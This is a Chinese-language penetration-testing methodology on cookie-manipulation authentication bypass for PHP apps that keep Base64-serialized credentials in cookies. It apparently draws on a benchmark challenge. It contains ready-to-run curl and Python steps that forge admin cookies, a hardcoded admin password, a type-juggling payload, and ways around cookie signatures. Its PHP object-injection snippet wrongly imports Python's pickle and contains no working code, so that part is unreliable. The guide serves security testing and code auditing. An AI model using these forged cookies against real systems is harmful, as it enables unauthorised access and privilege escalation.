# Cookie 操纵认证绕过攻击

## 1. 文档概述

### 1.1 编写目的
本文档为渗透测试人员提供一套标准化的 Cookie 操纵认证绕过测试与利用流程，重点针对使用客户端 Cookie 存储认证状态且缺乏完整性保护的应用程序。通过本方法论，测试人员能够系统性地检测和利用 Cookie 操纵漏洞实现认证绕过和权限提升。

### 1.2 适用范围
- 适用于所有使用 Cookie 存储认证状态但缺乏签名验证的 Web 应用
- 特别适用于 PHP 序列化 +Base64 编码的 Cookie 认证机制
- 适用于客户端存储敏感认证数据（用户名、密码、角色）的系统
- 适用于无服务器端会话管理或会话状态完全客户端化的应用

### 1.3 读者对象
- 执行渗透测试任务的安全工程师
- 进行代码审计的安全分析师
- 负责漏洞利用的红队成员

---

## 2. 核心渗透技术专题

### 专题一：Cookie 操纵认证绕过攻击

#### 2.1 技术介绍

Cookie 操纵认证绕过攻击是指攻击者通过修改客户端 Cookie 中的认证相关数据，绕过服务器的身份验证机制，实现未授权访问或权限提升的攻击技术。

**漏洞本质：**
- 应用程序将认证状态（用户名、密码、角色等）直接存储在客户端 Cookie 中
- 服务器端缺乏对 Cookie 数据的签名验证或完整性检查
- 服务器信任客户端提供的认证数据，直接用于授权决策
- 认证数据仅使用简单编码（如 Base64）而非加密保护

**典型攻击流程：**
```
攻击者 → 分析 Cookie 结构 → 解码 Cookie → 修改认证数据 → 重新编码 → 发送恶意 Cookie → 绕过认证
```

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
| :--- | :--- | :--- |
| **自定义认证系统** | 登录表单提交后设置认证 Cookie | Cookie 包含明文或简单编码的凭证 |
| **PHP 应用** | 使用 serialize()+base64_encode() 存储凭证 | PHP 序列化格式可被逆向工程 |
| **无会话管理** | 完全依赖 Cookie 存储认证状态 | 无服务器端会话验证 |
| **CTF 挑战应用** | 认证挑战类题目 | 故意设计脆弱的认证机制 |
| **遗留系统** | 老旧 PHP/ASP 应用 | 使用过时的认证实践 |
| **快速原型应用** | MVP 产品、内部工具 | 缺乏安全设计考量 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**步骤 1：Cookie 识别与收集**
```bash
# 使用浏览器开发者工具或代理工具
# 1. 访问登录页面，观察初始 Cookie
# 2. 提交登录表单，记录新增/变化的 Cookie
# 3. 分析 Cookie 名称、值、标志位
```

**步骤 2：Cookie 结构分析**
```bash
# 尝试解码常见的编码格式
# Base64 解码
echo "YToyOntzOjg6InVzZXJuYW1lIjtzOjQ6InRlc3QiO3M6ODoicGFzc3dvcmQiO3M6NDoidGVzdCI7fQ==" | base64 -d

# PHP 序列化格式识别
# 特征：a:2:{s:8:"username";...}
# a = array, s = string, i = integer, b = boolean
```

**步骤 3：Cookie 修改测试**
```bash
# 修改用户名测试
# 原始：a:2:{s:8:"username";s:4:"test";s:8:"password";s:4:"test";}
# 修改：a:2:{s:8:"username";s:5:"admin";s:8:"password";s:4:"test";}

# 重新编码并设置 Cookie
python3 -c "
import base64
payload = 'a:2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:4:\"test\";}'
print(base64.b64encode(payload.encode()).decode())
"
```

**步骤 4：权限测试**
```bash
# 使用修改后的 Cookie 发送请求
curl -H "Cookie: creds=修改后的编码值" http://target.com/

# 观察响应变化，确认是否获得更高权限
```

##### 2.3.2 白盒测试

**代码审计要点：**

**PHP 应用危险模式检测：**
```php
// 危险模式 1：直接序列化用户输入
$cookie_value = base64_encode(serialize([
    'username' => $_POST['username'],
    'password' => $_POST['password']
]));
setcookie('auth', $cookie_value);

// 危险模式 2：反序列化 Cookie 无验证
if (isset($_COOKIE['auth'])) {
    $auth = unserialize(base64_decode($_COOKIE['auth']));
    // 直接使用，无签名验证
}

// 危险模式 3：Cookie 中存储明文密码
setcookie('user', $username);
setcookie('pass', $password);  // 极度危险
```

**数据流追踪：**
```
用户输入 → serialize() → base64_encode() → setcookie()
                              ↓
                    客户端存储 Cookie
                              ↓
$_COOKIE → base64_decode() → unserialize() → 授权决策
```

#### 2.4 漏洞利用方法

##### 2.4.1 基础认证绕过

**场景 1：PHP 序列化 Cookie 操纵**

```bash
# 步骤 1：获取合法 Cookie（通过正常登录）
curl -X POST http://target.com/login \
     -d "username=test&password=test" \
     -c cookies.txt

# 步骤 2：分析 Cookie 结构
cat cookies.txt | grep creds
# 输出：creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjQ6InRlc3QiO3M6ODoicGFzc3dvcmQiO3M6NDoidGVzdCI7fQ==

# 步骤 3：解码分析
echo "YToyOntzOjg6InVzZXJuYW1lIjtzOjQ6InRlc3QiO3M6ODoicGFzc3dvcmQiO3M6NDoidGVzdCI7fQ==" | base64 -d
# 输出：a:2:{s:8:"username";s:4:"test";s:8:"password";s:4:"test";}

# 步骤 4：构造管理员凭证 Cookie
# 如果已知管理员用户名/密码（通过源码、配置泄露等）
python3 -c "
import base64
# 构造管理员凭证
admin_payload = 'a:2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:23:\"kl!RtYuUUig664ds32AKA87\";}'
print(base64.b64encode(admin_payload.encode()).decode())
"
# 输出：YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==

# 步骤 5：发送恶意 Cookie
curl -H "Cookie: creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjIzOiJrbCFSdFl1VVVpZzY2NGRzMzJBS0E4NyI7fQ==" \
     http://target.com/admin
```

##### 2.4.2 类型混淆攻击

**PHP 类型混淆利用：**
```bash
# 利用 PHP 松散比较 (==) 的类型转换特性
# 构造布尔值或 null 绕过密码检查

# Payload：使用布尔值 true 绕过密码比较
python3 -c "
import base64
payload = 'a:2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";b:1;}'
print(base64.b64encode(payload.encode()).decode())
"

# 发送请求
curl -H "Cookie: creds=编码后的 payload" http://target.com/
# 如果后端使用 == 比较，b:1 (true) 可能等于任何非空字符串
```

##### 2.4.3 PHP 对象注入链

**当 unserialize() 存在且环境中有可利用的类时：**
```php
// 寻找环境中存在危险魔术方法的类
// 如 SplFileObject、DirectoryIterator 等内置类

// 构造恶意序列化对象
python3 -c "
import base64
import pickle

# 示例：利用 SplFileObject 读取文件
# 这需要深入了解 PHP 内部类的 Gadget Chain
# 实际利用需要针对具体环境构造
"
```

##### 2.4.4 权限字段篡改

**如果 Cookie 中包含角色/权限字段：**
```bash
# 原始 Cookie（普通用户）
a:3:{s:8:"username";s:4:"user";s:4:"role";s:4:"user";s:8:"password";s:8:"mypass123";}

# 修改为管理员
a:3:{s:8:"username";s:4:"user";s:4:"role";s:5:"admin";s:8:"password";s:8:"mypass123";}

# 重新编码并测试
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过 Cookie 签名验证

**如果应用实现了简单的签名机制：**
```bash
# 检测签名算法
# 1. 修改 Cookie 值，观察是否被拒绝
# 2. 尝试常见签名绕过：
#    - 移除签名参数
#    - 使用空签名
#    - 算法混淆（如 JWT 的 alg:none）

# 示例：HMAC 签名绕过
# 原始：data=xxx&sig=abcd1234
# 尝试：data=xxx&sig=          (空签名)
# 尝试：data=xxx               (移除签名)
```

##### 2.5.2 绕过加密 Cookie

**如果 Cookie 使用弱加密：**
```bash
# 检测加密模式
# 1. 相同输入产生相同输出 → 确定性加密（如 ECB）
# 2. 相同输入产生不同输出 → 使用 IV/随机数

# ECB 模式攻击（如果适用）
# 1. 识别加密块边界（通常 16 字节）
# 2. 重排加密块改变数据含义
# 3. 块重放攻击
```

##### 2.5.3 无回显利用

**当无法直接看到认证结果时：**
```bash
# 使用时间差攻击
# 1. 记录合法请求的响应时间
# 2. 发送恶意 Cookie 请求
# 3. 比较响应时间差异

# 使用带外通道
# 1. 在 Cookie 中注入可触发外部请求的 payload
# 2. 监控外部请求确认利用成功
```

---

## 3. 附录

### 3.1 PHP 序列化格式速查表

| 类型 | 格式示例 | 说明 |
| :--- | :--- | :--- |
| 字符串 | `s:5:"hello";` | s:长度:"值"; |
| 整数 | `i:42;` | i:数值; |
| 布尔值 | `b:1;` / `b:0;` | b:1=true, b:0=false |
| 浮点数 | `d:3.14;` | d:数值; |
| 数组 | `a:2:{s:3:"key";s:5:"value";...}` | a:元素数:{键值对...} |
| NULL | `N;` | N; |
| 对象 | `O:8:"ClassName":2:{...}` | O:类名长度:"类名":属性数:{...} |

### 3.2 Base64 编码工具

```bash
# Linux/Mac
echo -n "待编码字符串" | base64
echo "待解码字符串" | base64 -d

# Python
python3 -c "import base64; print(base64.b64encode(b'string').decode())"
python3 -c "import base64; print(base64.b64decode('c3RyaW5n').decode())"

# 在线工具
# https://www.base64decode.org/
# https://base64.guru/
```

### 3.3 常见 Cookie 名称

| Cookie 名称 | 常见用途 |
| :--- | :--- |
| auth, authentication | 认证令牌 |
| session, sess_id | 会话 ID |
| user, username | 用户名 |
| creds, credentials | 凭证 |
| token, access_token | 访问令牌 |
| role, privilege | 角色/权限 |
| PHPSESSID | PHP 默认会话 ID |

### 3.4 利用检查清单

- [ ] 识别所有认证相关的 Cookie
- [ ] 分析 Cookie 编码格式（Base64/Hex/URL 编码等）
- [ ] 解码并理解 Cookie 数据结构
- [ ] 查找硬编码凭证（源码、配置、错误消息）
- [ ] 构造恶意 Cookie（管理员凭证/权限提升）
- [ ] 测试 Cookie 操纵是否成功
- [ ] 尝试类型混淆攻击（针对 PHP）
- [ ] 检查是否存在对象注入 Gadget
- [ ] 验证是否可访问管理员功能
- [ ] 记录完整的利用过程和证据

---

**文档版本：** 1.0  
**最后更新：** 2026 年 3 月  
**参考来源：** XBEN-014-24 渗透测试实战分析
